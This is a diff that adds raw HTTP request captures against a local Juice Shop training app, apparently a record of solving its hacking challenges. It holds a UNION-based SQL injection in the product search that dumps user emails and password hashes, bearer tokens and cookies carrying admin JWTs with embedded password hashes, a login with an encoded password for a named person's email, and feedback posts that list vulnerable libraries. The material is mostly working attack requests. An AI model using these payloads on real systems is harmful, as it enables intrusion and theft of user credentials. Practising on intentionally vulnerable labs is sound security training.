@@ -311,9 +311,179 @@ Sec-Fetch-User: ?1
 
 
 
+GET /rest/track-order/5267-adca09557a2f44c7 HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: application/json, text/plain, */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMjcuMC4wLjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDUtMTUgMjA6MDQ6NDAuNzM4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDUtMTYgMjE6MjU6MjAuNjIzICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY4NTkwNjYwNywiZXhwIjoxNjg1OTI0NjA3fQ.kAY8Sa7rl1XGRSm9FEYT16QAwKosoqpPZFGHpVLSd8RDdUgJxPR3-EEXr_xnHL1_2NsyuhUqFPhOnyEdfBIDMimK-Z7ft_aOf6lmztr3QrnW9wo5JPwEDiVBRiiANiUBSR5l1Y8etjdKUrJ11GQPIJ7poyCNEvFteIdZtQCfJu0
+
+Connection: close
+
+Referer: http://localhost:3000/
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=6mu9t6U5HohQtMTmCkF1HOuaiQ3uqncOoTDriBJfQkHD7tYRc84S59U78tbxSL1Uk8hoEt88TOXsLNi12h3RujWHOE; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMjcuMC4wLjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDUtMTUgMjA6MDQ6NDAuNzM4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDUtMTYgMjE6MjU6MjAuNjIzICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY4NTkwNjYwNywiZXhwIjoxNjg1OTI0NjA3fQ.kAY8Sa7rl1XGRSm9FEYT16QAwKosoqpPZFGHpVLSd8RDdUgJxPR3-EEXr_xnHL1_2NsyuhUqFPhOnyEdfBIDMimK-Z7ft_aOf6lmztr3QrnW9wo5JPwEDiVBRiiANiUBSR5l1Y8etjdKUrJ11GQPIJ7poyCNEvFteIdZtQCfJu0
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
 
 
 
 
+POST /api/Feedbacks/ HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: application/json, text/plain, */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMjcuMC4wLjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDUtMTUgMjA6MDQ6NDAuNzM4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDUtMTYgMjE6MjU6MjAuNjIzICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY4NTkwNjYwNywiZXhwIjoxNjg1OTI0NjA3fQ.kAY8Sa7rl1XGRSm9FEYT16QAwKosoqpPZFGHpVLSd8RDdUgJxPR3-EEXr_xnHL1_2NsyuhUqFPhOnyEdfBIDMimK-Z7ft_aOf6lmztr3QrnW9wo5JPwEDiVBRiiANiUBSR5l1Y8etjdKUrJ11GQPIJ7poyCNEvFteIdZtQCfJu0
+
+Content-Type: application/json
+
+Content-Length: 197
+
+Origin: http://localhost:3000
+
+Connection: close
+
+Referer: http://localhost:3000/
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=6mu9t6U5HohQtMTmCkF1HOuaiQ3uqncOoTDriBJfQkHD7tYRc84S59U78tbxSL1Uk8hoEt88TOXsLNi12h3RujWHOE; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMjcuMC4wLjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDUtMTUgMjA6MDQ6NDAuNzM4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDUtMTYgMjE6MjU6MjAuNjIzICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY4NTkwNjYwNywiZXhwIjoxNjg1OTI0NjA3fQ.kAY8Sa7rl1XGRSm9FEYT16QAwKosoqpPZFGHpVLSd8RDdUgJxPR3-EEXr_xnHL1_2NsyuhUqFPhOnyEdfBIDMimK-Z7ft_aOf6lmztr3QrnW9wo5JPwEDiVBRiiANiUBSR5l1Y8etjdKUrJ11GQPIJ7poyCNEvFteIdZtQCfJu0
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+
+
+{"UserId":1,"captchaId":5,"captcha":"2","comment":"vulnerable libraries: express-jwt 0.1.3, grunt ~1.0, js-yaml 3.10, marsdb ~0.6, sanitaze-html 1.4.2, sequelize ~4 (***in@juice-sh.op)","rating":1}
+
+
+
+POST /rest/user/login HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: application/json, text/plain, */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/json
+
+Content-Length: 88
+
+Origin: http://localhost:3000
+
+Connection: close
+
+Referer: http://localhost:3000/
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=PyuOt8UEHOhEt2TyCDFEHou9i9ZuDgcLKTmwi1EfonHv8teyckjSLVUVMiZxfzVSlYUoQh4ksWWIK5sP5izBf47UkNHZp
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+
+
+{"email":"bjoern.kimminich@gmail.com","password":"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="}
+
+
+
+
+
+
+POST /api/Feedbacks/ HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: application/json, text/plain, */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJiakFBcm4ua0FtbUFuQWNoQGdtQUFsLmNBbSIsInBhc3N3b3JkIjoiYmFjMzYzYWQ1M2VlMWMxOGY2NGExOTI2OThjNGMxMTQiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTA2LTA0IDIxOjA4OjQwLjEyMiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTA2LTA0IDIxOjA4OjQwLjEyMiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2ODU5MTI5NjYsImV4cCI6MTY4NTkzMDk2Nn0.YA_38-TyPJC6loTVzKHPlvLkgvrtzdkCVDzIhAww6In6b3F50DN8yFmUo5BZOX99-3gn8McQl4cPEz7ToKbbsIAAqQ67Fc8s97c4ZKe7HlXiSJJxQ5L6haFTsVj1OujUyMM_F9R6pXHLMGF8KmKQiO6B6cV51cY4PPoLMWWMP7Q
+
+Content-Type: application/json
+
+Content-Length: 137
+
+Origin: http://localhost:3000
+
+Connection: close
+
+Referer: http://localhost:3000/
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=pLuyteU8HqhYtlTDCPFlHJuecgi3UMoupzcv8TQ8iW2f9OHrotpzc1qSkNUVMiJZfELSbNU1rFwntJJI5NsJLilef6rFbXHL3; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJiakFBcm4ua0FtbUFuQWNoQGdtQUFsLmNBbSIsInBhc3N3b3JkIjoiYmFjMzYzYWQ1M2VlMWMxOGY2NGExOTI2OThjNGMxMTQiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTA2LTA0IDIxOjA4OjQwLjEyMiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTA2LTA0IDIxOjA4OjQwLjEyMiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2ODU5MTI5NjYsImV4cCI6MTY4NTkzMDk2Nn0.YA_38-TyPJC6loTVzKHPlvLkgvrtzdkCVDzIhAww6In6b3F50DN8yFmUo5BZOX99-3gn8McQl4cPEz7ToKbbsIAAqQ67Fc8s97c4ZKe7HlXiSJJxQ5L6haFTsVj1OujUyMM_F9R6pXHLMGF8KmKQiO6B6cV51cY4PPoLMWWMP7Q
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+
+
+{"UserId":23,"captchaId":7,"captcha":"67","comment":"typosquatting vulnerability in epilogue-js (***Arn.kAmmAnAch@gmAAl.cAm)","rating":1}
+
+
+
+
+
+
+
+
+GET /rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users-- HTTP/1.1
+
+Host: localhost:3000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=oEuNt1UBHPhgtyTqCQFXHquac2Fki6UZJu7Nc9mT4wiWYfRvHyDto9ca2SKyUO5i7qHj2SZyU39Tm7tXXIPasqQi4kForUNzHj2; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMjcuMC4wLjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDUtMTUgMjA6MDQ6NDAuNzM4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDUtMTYgMjE6MjU6MjAuNjIzICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY4NTkxNDcwNiwiZXhwIjoxNjg1OTMyNzA2fQ.NaLjtv-URbPQh8EmWxxpVGK3GoqvyVOTUJDbLQx-Y2RWmB20xUSoy8EwKqe21aQdTFyMOqeJLIm1Vh7YZVhBRdcwwQPP97eSP7GF7gvebMZUzMaFNtzQdIgmjSFBcH1lNBtG16CP9tIwnz8z30ZGIS5tSGGgfk67_eDxzVuFi9M
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: none
+
+Sec-Fetch-User: ?1
 
 
